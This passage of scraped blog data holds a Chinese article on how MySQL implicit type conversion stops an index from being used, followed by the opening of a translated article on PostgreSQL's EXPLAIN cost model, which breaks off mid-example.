class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6350c944808350524256-17\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'111111'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'andytohome@gmail.com'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'111'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'12345678901'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-e\">now</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0043 seconds] -->\r\n<p></p>\n<h4>引子</h4>\n<p>首先我们基于上述数据结构中,我们来看看下面这个执行计划:</p>\n<blockquote><p>explain select * from t_base_user where telephone=12345678901;</p></blockquote>\n<p>执行计划结果:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/05cc14303bda573f6977d4d18c48c42a.png\"><img class=\"alignnone size-full wp-image-113317\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/05cc14303bda573f6977d4d18c48c42a.png\" alt=\"QQ截图20171214105031\"></a></p>\n<p>细心的童鞋应该已经看出来了,为什么数据结构中已经在telephone字段上新建了idx_telephone索引，而上述语句并没有走索引,而是全表扫描。这是为什么呢？带着这疑问,我们来看看今天的主角——MySQL隐式类型转换</p>\n<h4>什么是隐式类型转换？</h4>\n<p>在MySQL中:</p>\n<blockquote><p>当操作符与不同类型的操作数一起使用时，会发生类型转换以使操作数兼容。则会发生转换隐式</p></blockquote>\n<p>也就是说,MySQL会根据需要自动将数字转换为字符串，将字符串转换数字。看到这个概念之后,是不是有一种茅塞顿开的感觉。哦… 原来在数据结构中telephone字段为字符串(varchar)类型,而我们传的手机号是数字类型。现在我们将SQL修改下:</p>\n<blockquote><p>select * from t_base_user where telephone=’12345678901′;</p></blockquote>\n<p>再看看上述语句的执行计划:</p>\n<blockquote><p>explain select * from t_base_user where telephone=’12345678901′;</p></blockquote>\n<p>结果:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/70ee38005ac1816b149f228df6287fd2.png\"><img class=\"alignnone size-full wp-image-113318\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/70ee38005ac1816b149f228df6287fd2.png\" alt=\"QQ截图20171214105207\"></a></p>\n<p>从这里看,现在语句已经走索引了。为了加深我们对隐式类型转换的印象,我们再多看看几个隐式类型转换案例:</p>\n<p>案例一: 字符串转换为数字</p>\n<blockquote><p>mysql &gt; SELECT 1+’1′;</p></blockquote>\n<p>结果:</p>\n<blockquote><p>mysql &gt; 2</p></blockquote>\n<p>案例二: 数字转换为字符串</p>\n<blockquote><p>mysql -&gt; SELECT CONCAT(1024,’ andyqian’);</p></blockquote>\n<p>结果:</p>\n<blockquote><p>‘1024,’ andyqian’;</p></blockquote>\n<p>此时CONCAT(字符拼接)函数就将1024进行了隐式类型转换。</p>\n<h4>如何避免隐式类型转换?</h4>\n<p>只有当清楚的知道隐式类型转换的规则，才能从根本上避免产生隐式类型转换。MySQL也在官网描述了进行隐式类型转换的一些规则如下:</p>\n<p>1. 隐式类型转换规则:</p>\n<ul>\n<li>如果一个或两个参数都是NULL，比较的结果是NULL，除了NULL安全的&lt;=&gt;相等比较运算符。对于NULL &lt;=&gt; NULL，结果为true。不需要转换</li>\n<li>如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。</li>\n<li>如果两个参数都是整数，则将它们作为整数进行比较。</li>\n<li>如果不与数字进行比较，则将十六进制值视为二进制字符串</li>\n<li>如果其中一个参数是十进制值，则比较取决于另一个参数。 如果另一个参数是十进制或整数值，则将参数与十进制值进行比较，如果另一个参数是浮点值，则将参数与浮点值进行比较</li>\n<li>如果其中一个参数是TIMESTAMP或DATETIME列，另一个参数是常量，则在执行比较之前将常量转换为时间戳。</li>\n<li>在所有其他情况下，参数都是作为浮点数（实数）比较的。</li>\n</ul>\n<p>2. 使用CAST函数显示转换<br>\n我们可以使用CAST显示的将类型进行转换,如下所示:</p>\n<blockquote><p>mysql&gt; SELECT 38.8, CAST(38.8 AS CHAR);</p></blockquote>\n<p>结果:</p>\n<blockquote><p>mysql &gt; 38.8, ‘38.8’</p></blockquote>\n<p>如上述中:</p>\n<blockquote><p>select * from t_base_user where telephone=cast(12345678901 as char);</p></blockquote>\n<p>查看执行计划,我们也可以看出</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/383bbad2ced38d0ca41ae862eaae9165.png\"><img class=\"alignnone size-full wp-image-113319\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/383bbad2ced38d0ca41ae862eaae9165.png\" alt=\"QQ截图20171214105349\"></a></p>\n<p>你看,这个时候也走索引了。</p>\n<p>3. 类型一致<br>\n这里说的类型一致,指的是在写SQL时,参数类型一定要与数据库中的类型一致,避免产生隐式类型转换,就如刚才在文首时,如果多检查,写的SQL的参数类型与数据库中字段类型一致，也就不会不走索引了，你说是不是？</p>\n<h4>小心隐式类型转换</h4>\n<p>这里再重申一次,写SQL时一定要检查参数类型与数据库字段类型一致,(如果参数不一致,也要使用CAST函数显示转换成一致)否则造成隐式类型转换,不走索引,后果简直不堪设想, 在前面<a href=\"http://mp.weixin.qq.com/s?__biz=MzI2NDU3OTg5Nw==&amp;mid=2247483736&amp;idx=1&amp;sn=e3fa0bf61b77c9ca12ee1d295c51313a&amp;scene=21#wechat_redirect\" rel=\"nofollow\">《写会MySQL索引》</a>这篇文章中提到过,不走索引,轻则造成慢查询，重则造成数据库服务器CPU100%。唉,说到这里,不瞒你说，我就吃过不少MySQL隐式类型转换的亏 ! (如慢查询) !</p>\n<h4>小结</h4>\n<p>看到这里,是不是有一种,数据表设计还真不是件容易的事情。需要考虑的因素太多太多了,需要考虑字段类型,索引设计,还有各种约束条件等等。也一定要谨慎谨慎再谨慎！其实换个角度就更容易理解了,大家都知道高楼大厦都是需要一个好的地基的,在数据库表设计中,前期的表结构设计就是这个地基，其重要性可想而知。</p>\n<p>从后续开始,每篇MySQL文章最后,都推荐一个常用且实用的MySQL命令:</p>\n<p>今天的命令是:</p>\n<blockquote><p>show full columns from table_name;</p></blockquote>\n<p>作用: 显示指定表所有列信息</p>\n<p>例如:</p>\n<blockquote><p>show full columns from t_base_user;</p></blockquote>\n<p>返回结果如下图所示:</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0ae91cc856d3e41ea81248f9f6d7d9af.png\"><img class=\"alignnone size-full wp-image-113320\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0ae91cc856d3e41ea81248f9f6d7d9af.png\" alt=\"QQ截图20171214105501\"></a></p>\n<p>其中:<br>\nField: 字段名<br>\nType: 该字段类型<br>\nCollation: 描述了如何对查询出来的数据进行比较和排序<br>\nNull: 是否允许为空, NO: 不允许，YES 允许<br>\nKey: 键,例如: 主键(PRI), 唯一键(UNI) 等<br>\nDefault: 该字段默认值 Extra: 附加信息如自增主键上的(auto_increment)<br>\nPrivileges: 权限,有select,update等<br>\nComment: 字段注释</p>\n<p>注意: 通过该命令显示都是建表时的信息,这里着重强调一下,在数据库建表时,在每个字段上, 一定要加注释,加注释，加注释！</p>\n<p><strong>最后:  </strong>大家今天剁手了吗？ 祝大家晚安!</p>\n<p>相关阅读:</p>\n<p><a href=\"http://blog.jobbole.com/113142/\" target=\"_blank\" rel=\"nofollow\">写会MySQL索引</a></p>\n<p><a href=\"http://blog.jobbole.com/112877/\" target=\"_blank\" rel=\"nofollow\">读懂MySQL执行计划</a></p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113315\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113315votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113315\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/75f6595b87bc254afe77bc1151f1aea91fb72f4b.jpg"}
{"url_object_id": "2d2fe070e21aca17bf9d6ef863e27af3", "title": "PostgreSQL 查询成本模型", "url": "http://blog.jobbole.com/113358/", "create_date": "2017/12/21", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/PostgreSQL-logo.gif"], "praise_nums": 1, "comment_nums": 1, "favor_nums": 1, "tags": "IT技术,PostgreSQL,数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://shiroyasha.io/the-postgresql-query-cost-model.html\">igor_sarcevic</a>   译文出处：<a target=\"_blank\" href=\"http://blog.csdn.net/dev_csdn/article/details/78841624\">CSDN/无阻我飞扬</a>   </div><p><em>摘要：PostgreSQL是一个自由的对象-关系数据库服务器(数据库管理系统)，被业界誉为“最先进的开源数据库”，本文作者以代码实例说明了如何计算和评估PostgreSQL查询成本，以下是译文。</em></p>\n<p>数据库查询速度如果太慢会从很多方面损害机构，比如可能会损害一些优秀应用程序的声誉，因为数据库查询速度过慢，造成后台处理速度慢得令人痛苦，并大幅增加基础设施的成本。作为一名经验丰富的Web开发人员，了解数据层的优化策略是绝对必要的。</p>\n<p><img class=\"aligncenter\" title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/e5e6809a4b86af8aff9897d8f816be4c.jpeg\" alt=\"这里写图片描述\"></p>\n<p>在本文中，我们将探讨PostgreSQL的成本模型，如何了解<code>explain</code>命令（关于explain命令可参见这篇<a href=\"http://toplchx.iteye.com/blog/2091860\" target=\"_blank\">文章</a>）的输出，最重要的是如何利用这些模型数据来提高应用程序的吞吐量。</p>\n<h1 id=\"使用postgresql-explain-命令\">使用PostgreSQL Explain 命令</h1>\n<p>在应用程序中部署一个新的查询语句之前，最好通过PostgreSQL中的 <code>explain</code>中的命令来运行它，以评估新查询对应用系统性能的影响。</p>\n<p>以一个示例数据库表开始，来说明<code>explain</code>命令的用法。这个表存有一百万条数据记录。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486f7b426240846\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # CREATE TABLE users (id serial, name varchar);\r\n\r\ndb # INSERT INTO users (name) SELECT 'John'\r\n FROM generate_series(1, 1000000);\r\n\r\ndb # SELECT count(*) FROM users;\r\n      count\r\n\r\n 1000000\r\n(1 row)\r\n\r\ndb # SELECT id, name FROM users LIMIT 10;\r\n id | name\r\n----+------\r\n  1 | John\r\n  2 | John\r\n  3 | John\r\n  4 | John\r\n  5 | John\r\n  6 | John\r\n  7 | John\r\n  8 | John\r\n  9 | John\r\n 10 | John\r\n(10 rows)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f7b426240846-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f7b426240846-26\">26</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># CREATE TABLE users (id serial, name varchar);</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-3\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># INSERT INTO users (name) SELECT 'John'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-4\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">generate_series</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-6\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SELECT count(*) FROM users;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-7\"><span class=\"crayon-h\">      </span><span class=\"crayon-i\">count</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-8\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-9\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-10\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-12\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># SELECT id, name FROM users LIMIT 10;</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-v\">id</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-14\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-15\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-16\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-17\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-18\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-19\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">5</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-20\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">6</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-21\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-22\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-23\"><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">9</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">John</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-24\"><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">John</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f7b426240846-25\"><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f7b426240846-26\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n<p>假设需要用一个给定的id来查找一个用户名，但是在部署新的查询代码之前，要评估这个查询操作的成本。运行一个explain语句来做相关查询：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a635a3486f85150033208\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndb # EXPLAIN SELECT * FROM users WHERE id = 870123;\r\n\r\n        QUERY PLAN                  \r\n--------------------------------------------------\r\n Gather  (cost=1000.00..11614.43 rows=1 width=9)\r\n   Workers Planned: 2\r\n           -&gt;  Parallel Seq Scan on users  (cost=0.00..10614.33 rows=1 width=9)\r\n     Filter: (id = 870123)\r\n\r\n(4 rows)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f85150033208-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f85150033208-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f85150033208-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f85150033208-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a635a3486f85150033208-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a635a3486f85150033208-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-1\"><span class=\"crayon-v\">db</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># EXPLAIN SELECT * FROM users WHERE id = 870123;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f85150033208-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">QUERY </span><span class=\"crayon-v\">PLAN</span><span class=\"crayon-h\">                  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f85150033208-4\"><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-5\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Gather</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1000.00..11614.43</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">width</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a635a3486f85150033208-6\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">Workers </span><span class=\"crayon-v\">Planned</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a635a3486f85150033208-7\"><span class=\"crayon-h\">           </span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\">  </span><span class=\"crayon-e\">Parallel </span><span class=\"crayon-e\">Seq </span><span class=\"crayon-e\">Scan </span><span class=\"crayon-e\">on </span><span class=\"crayon-e\">users</span><span class=\"crayon-h\">  </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">cost</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.00..10614.33</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">rows</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">width</span><span 